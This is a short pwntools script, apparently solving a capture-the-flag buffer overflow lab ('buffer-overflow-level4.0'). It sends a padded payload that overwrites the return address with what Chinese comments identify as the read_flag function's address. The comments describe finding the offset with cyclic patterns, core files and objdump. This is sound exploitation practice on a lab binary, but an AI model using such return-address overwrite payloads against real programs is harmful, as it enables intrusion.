from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level4.0"
p = process(challenge_path)

# create string
name=b'\x61' * 16+b'\xc0\x12\x40\x00\x00\x00\x00\x00'*16+b'\x01'+b'\x00'
p.sendlineafter("Give me your input\n",name)
#p.sendlineafter("Bye bye~\n","read_flag();")
# 接收题目的输出
result = p.recvall()

# 打印题目的输出python3 /home/hacker/buf3.1.py
print(result)
'''
需要用cylic构造数据包试探rip位置，因为elf文件在某些异常情况下终止会在相同目录下产生core文件记录异常信息
但challenge目录运行不产生core，复制到hacker目录运行分析 https://blog.csdn.net/ydyang1126/article/details/51769010
readelf -h corefile，core程序头表会标注type为core

不知为何使用gdb无法调试core
直接用objdump看汇编代码，送入read_flag地址就好了
'''